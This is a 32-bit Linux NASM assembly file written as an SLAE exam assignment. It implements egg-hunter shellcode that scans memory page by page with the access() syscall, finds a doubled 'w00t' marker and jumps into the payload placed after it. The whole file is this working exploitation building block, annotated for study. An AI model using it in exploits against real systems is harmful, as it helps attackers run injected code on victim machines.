; Filename: assignment3.nasm
; Author:  Adam Brown
; Website:  http://coffeegist.com
;
;
; Purpose: Create Egg Hunting Shellcode for SLAE Exam, Assignment 3

global _start

section .text
_start:

  ; zero out
  xor ecx, ecx
  mul ecx

; VAS organized by "pages"
; PAGE_SIZE = 4096 (0x1000)
NEXT_REGION: ; prepare to align page
  or dx, 0xfff ; next instruction inc edx will move edx to new page

NEXT_ADDRESS: ; increment memory address to look at
  inc edx

; ACCESS check
; int access(const char *pathname, int mode);
; syscall # 33 (0x21)
;
; Argument Values
; *pathname - address we are checking (edx)
; mode - mode we are checking for F_OK=0 (ecx)

  lea ebx, [edx+0x4]
  xor eax, eax
  mov al, 0x21
  int 0x80

  ; check results
  cmp al, 0xf2 ; EFAULT = 14 -> 0xe -> 2's complement -> 0xf2
  jz short NEXT_REGION ; In a bad region, move to next page

  cmp dword [edx], 0x74303077 ; w00t
  jnz short NEXT_ADDRESS

  cmp dword [edx+4], 0x74303077 ; second w00t
  jnz short NEXT_ADDRESS

  add edx, 0x8 ; Move past the w00tw00t
  jmp edx
